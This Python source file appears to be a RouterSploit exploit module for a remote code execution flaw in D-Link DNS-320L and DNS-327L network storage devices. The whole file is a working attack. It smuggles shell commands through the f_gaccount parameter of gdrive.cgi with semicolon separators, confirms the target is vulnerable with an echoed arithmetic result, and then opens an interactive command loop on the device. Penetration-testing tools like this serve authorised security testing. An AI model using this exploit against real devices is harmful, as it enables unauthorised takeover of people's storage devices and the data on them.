import re
import string

from routersploit import (
    exploits,
    print_success,
    print_status,
    print_error,
    print_info,
    random_text,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for D-Link DNS-320L and DNS-327L Remote Code Execution vulnerability.
    If the target is vulnerable, command loop is invoked that allows executing commands on the device.
    """
    __info__ = {
        'name': 'D-LINK DNS-320L & DIR-327L RCE',
        'description': 'Module exploits D-Link DNS-320L, DNS-327L Remote Code Execution vulnerability which allows executing command on the device.',
        'authors': [
            'Gergely Eberhardt',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'http://www.search-lab.hu/media/D-Link_Security_advisory_3_0_public.pdf',
        ],
        'devices': [
            'DNS-320L 1.03b04',
            'DNS-327L, 1.02',
        ]
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)
    port = exploits.Option(80, 'Target Port')

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_status("Invoking command loop...")
            self.command_loop()
        else:
            print_error("Target is not vulnerable")

    def command_loop(self):
        while 1:
            cmd = raw_input("cmd > ")

            if cmd in ['exit', 'quit']:
                return

            print_info(self.execute(cmd))

    def execute(self, cmd):
        mark = random_text(32)
        url = "{}:{}/cgi-bin/gdrive.cgi?cmd=4&f_gaccount=;{};echo {};".format(self.target, self.port, cmd, mark)

        response = http_request(method="GET", url=url)
        if response is None:
            return ""

        if mark in response.text:
            regexp = "(|.+?){}".format(mark)
            res = re.findall(regexp, response.text, re.DOTALL)

            if len(res):
                return res[0]

        return ""

    @mute
    def check(self):
        number = int(random_text(6, alph=string.digits))
        solution = number - 1

        cmd = "echo $(({}-1))".format(number)
        url = "{}:{}/cgi-bin/gdrive.cgi?cmd=4&f_gaccount=;{};echo ffffffffffffffff;".format(self.target, self.port, cmd)

        response = http_request(method="GET", url=url)
        if response is None:
            return False  # target is not vulnerable

        if response.status_code == 200 and str(solution) in response.text:
            return True  # target is vulnerable

        return False  # target is not vulnerable
